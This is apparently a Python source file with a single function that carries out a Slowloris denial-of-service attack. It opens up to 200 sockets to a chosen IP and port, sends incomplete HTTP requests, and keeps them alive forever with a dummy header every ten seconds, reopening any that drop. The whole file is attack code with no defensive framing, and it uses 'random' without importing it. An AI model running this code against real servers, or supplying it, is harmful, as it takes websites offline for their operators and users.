import socket
import threading
import time
from colorama import Fore, Style

def slowloris_attack(target_ip, target_port, sockets_count=200):
    sockets = []

    print(f"{Fore.YELLOW}[*] Creating sockets for Slowloris attack...{Style.RESET_ALL}")
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
            s.send("User-Agent: slowloris\r\n".encode("utf-8"))
            s.send("Connection: keep-alive\r\n\r\n".encode("utf-8"))
            sockets.append(s)
        except socket.error:
            break

    print(f"{Fore.CYAN}[+] {len(sockets)} sockets created, starting attack...{Style.RESET_ALL}")
    while True:
        for s in sockets:
            try:
                s.send("X-a: b\r\n".encode("utf-8"))
                print(f"{Fore.MAGENTA}[Slowloris] Sent keep-alive header{Style.RESET_ALL}")
            except socket.error:
                sockets.remove(s)
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target_ip, target_port))
                    sockets.append(new_sock)
                except socket.error:
                    continue
        time.sleep(10)
